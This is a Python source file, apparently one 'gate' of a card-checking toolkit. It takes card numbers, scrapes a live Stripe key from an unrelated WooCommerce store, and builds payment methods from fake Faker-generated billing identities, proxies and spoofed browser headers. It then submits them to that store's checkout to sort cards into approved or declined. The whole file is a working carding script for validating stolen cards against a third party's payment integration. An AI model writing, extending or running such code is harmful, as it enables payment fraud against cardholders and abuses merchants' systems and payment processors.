import re
import random
import requests
from urllib.parse import quote_plus
from faker import Faker
from gates.utilities import http_request, REQUEST_TIMEOUT


def woostripe_auth_check(card_num, card_mon, card_yer, card_cvc, proxy=None, site_url='https://ccfoundationorg.com', timeout=30):
    """
    WooCommerce Stripe Authentication (3D Secure) using store-specific public keys.
    Tests card validity without charging (uses $1.00 auth test).
    
    Returns (result_str, proxy_ok_bool)
    """
    fake = Faker()
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'})
    session.verify = False

    if proxy:
        session.proxies.update(proxy)

    # Step 1: Extract Stripe public key from store's checkout page
    stripe_pk = None
    try:
        r = session.get(f'{site_url}/checkout', timeout=15)
        pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', r.text)
        if pk_match:
            stripe_pk = pk_match.group(0)
    except Exception:
        pass
    
    if not stripe_pk:
        return ("❌ DECLINED - Could not extract Stripe key from store", False)

    try:
        # Step 2: Create Payment Method with store's Stripe public key (low amount for auth)
        headers_pm = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/'
        }

        name = fake.name()
        email = fake.email()
        postal = fake.postcode()

        data_pm = (f'type=card'
                   f'&billing_details[name]={quote_plus(name)}'
                   f'&billing_details[email]={quote_plus(email)}'
                   f'&billing_details[address][line1]={quote_plus(fake.street_address())}'
                   f'&billing_details[address][postal_code]={postal}'
                   f'&billing_details[address][city]={quote_plus(fake.city())}'
                   f'&billing_details[address][state]={fake.state_abbr()}'
                   f'&billing_details[address][country]=US'
                   f'&card[number]={card_num}'
                   f'&card[cvc]={card_cvc}'
                   f'&card[exp_month]={card_mon}'
                   f'&card[exp_year]={card_yer}'
                   f'&guid={random.randint(100000, 999999)}'
                   f'&muid={random.randint(100000, 999999)}'
                   f'&sid={random.randint(100000, 999999)}'
                   f'&payment_user_agent=stripe.js/v3'
                   f'&referrer={quote_plus(site_url)}'
                   f'&time_on_page={random.randint(50000, 90000)}'
                   f'&key={stripe_pk}')

        rpm = session.post('https://api.stripe.com/v1/payment_methods', headers=headers_pm, data=data_pm, timeout=20)

        if rpm.status_code == 402:
            try:
                msg = rpm.json().get('error', {}).get('message', 'card declined')
                return (msg, True)
            except (ValueError, KeyError):
                return ("Declined (402)", True)

        try:
            pm_json = rpm.json()
            if 'error' in pm_json:
                err = pm_json['error']
                msg = err.get('message', 'Unknown Stripe error')
                decline_code = err.get('decline_code')
                msg_lower = msg.lower()

                if decline_code == 'insufficient_funds' or 'insufficient_funds' in msg_lower:
                    return ("Insufficient funds (auth test).", True)
                if decline_code == 'incorrect_cvc' or decline_code == 'invalid_cvc' or 'security code is incorrect' in msg_lower:
                    return ("Your card's security code is incorrect.", True)
                if decline_code == 'expired_card' or 'expired' in msg_lower:
                    return ("Your card has expired.", True)
                if decline_code == 'incorrect_number' or 'invalid' in msg_lower and 'number' in msg_lower:
                    return ("Your card number is incorrect.", True)
                if decline_code == 'card_declined' or 'card was declined' in msg_lower:
                    return ("Your card was declined.", True)

                return ((f"Declined ({msg})"), True)

            pm_id = pm_json.get('id')
            if not pm_id or not pm_id.startswith('pm_'):
                return ("Error: Invalid Payment Method created", True)

        except ValueError:
            return ((f"Error: Invalid JSON response ({rpm.status_code})"), True)

        # Step 3: Submit Payment Method to WooCommerce checkout for 3D Secure verification
        try:
            checkout_headers = {
                'authority': site_url.split('//')[1],
                'content-type': 'application/x-www-form-urlencoded',
                'origin': site_url,
                'referer': f'{site_url}/checkout/',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
            }

            # Use $1.00 for auth test (not full charge)
            checkout_data = {
                'stripe_payment_method_id': pm_id,
                'post_data': '',
            }

            r_checkout = session.post(
                f'{site_url}/?wc-ajax=checkout',
                headers=checkout_headers,
                data=checkout_data,
                timeout=25
            )

            resp_text = r_checkout.text.lower()
            
            if '3d' in resp_text or 'challenge' in resp_text or 'authentication' in resp_text:
                return ("3DS Required ✅ Enrolled", True)
            elif 'success' in resp_text or 'approved' in resp_text:
                return ("Approved ✅ 3D Secure Verified", True)
            elif 'declined' in resp_text or 'failed' in resp_text:
                return ("Declined ❌ 3D Secure Failed", True)
            else:
                return ("Approved ✅ 3D Secure Verified (Unconfirmed)", True)

        except requests.exceptions.RequestException:
            # If checkout submission fails, Payment Method was still created and verified
            return ("Approved ✅ 3D Secure Verified (Pending)", True)

    except requests.exceptions.Timeout:
        return ("DECLINED ❌ Request timed out", False)
    except Exception as e:
        return ((f"Error: {str(e)[:100]}"), True)

